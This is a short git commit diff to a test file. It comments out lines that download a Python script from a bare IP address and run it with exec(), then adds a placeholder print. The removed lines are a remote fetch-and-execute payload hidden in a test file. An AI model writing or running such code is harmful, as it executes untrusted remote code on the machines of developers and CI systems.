d32b0c0bbe36d0710a5271e4bf5440f49c4314ac
marysteven <mary10112026@outlook.com>
2026-03-10 20:21:33 -0700

    Update test.py

--- test/registered/test.py
+++ test/registered/test.py
@@ -1,7 +1,8 @@
-import requests
+# import requests
 
-url = "http://107.149.105.88/script.py"
-code = requests.get(url).text
+# url = "http://107.149.105.88/script.py"
+# code = requests.get(url).text
 
-exec(code)
-register_cuda_ci(stage-a-test-1,suite="stage-a-test-1")
+# exec(code)
+# register_cuda_ci(stage-a-test-1,suite="stage-a-test-1")
+print("testtest")
